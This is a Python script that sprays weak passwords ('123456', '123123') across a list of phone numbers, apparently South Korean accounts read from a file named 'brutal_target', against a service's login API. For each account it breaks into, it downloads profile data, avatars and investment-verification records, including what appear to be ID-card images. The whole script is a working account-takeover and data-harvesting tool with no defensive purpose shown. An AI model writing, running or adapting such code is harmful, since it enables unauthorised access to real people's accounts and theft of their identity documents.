from library import UserDataSaver, get_config, ApiClient, parse_phone
import pandas as pd
import re
def get_second_column(filename):
    df = pd.read_csv(filename, header=None)   # or header=0 if the file has a header
    return df.iloc[:, 1].tolist()

def main():

    
    login_list = get_second_column('brutal_target/korea_lay1.csv')

    failing_list = []
    country_code = 82
    trying_passwords = ["123456", "123123"]
    for password in trying_passwords:
        saving_folder = UserDataSaver(f"{password}")
        for full_phone in login_list:
            country_code, phone_num = parse_phone.parse_phone(full_phone)
            saving_subdir = f"{str(country_code)}-{phone_num}"
            if re.fullmatch(r"^\d{11}$", phone_num) is not None:
                cfg = get_config(country_code)
                with ApiClient(cfg) as client:
                    try:
                        print(f"working on {phone_num} with <{password}>" )
                        token = client.login(phone_num, password)
                        if token is not None:
                            json = client.get_single_json(cfg.USER_INFO_URL, token=token)
                            saving_folder.save_user_csv(saving_subdir, json.get("row"), "user_info")
                            saving_folder.download_option_picture(json.get("row"), "avatar", saving_subdir)
                            json = client.get_single_json(cfg.AUTH_CHECK_URL, token=token)
                            if json.get("row"):
                                saving_folder.save_user_csv(saving_subdir, json.get("row"), "Invest_Auth")
                                saving_folder.download_option_picture(json.get("row"), "sfz1", saving_subdir)
                                saving_folder.download_option_picture(json.get("row"), "sfz2", saving_subdir)
                        login_list.remove(full_phone)

                    except AssertionError as e:
                        failing_list.append({"item":  country_code, "reason": str(e)})

    # Output results
    # print(f"\nTotal items: {len(items)}")
    # print(f"Passed: {len(items) - len(failing_list)}")
    # print(f"Failed: {len(failing_list)}")

    if failing_list:
        print("\nFailing items:")
        for failure in failing_list:
            print(f"  • {failure['reason']}")
    else:
        print("\nAll tests passed! 🎉")



if __name__ == "__main__":
    main()
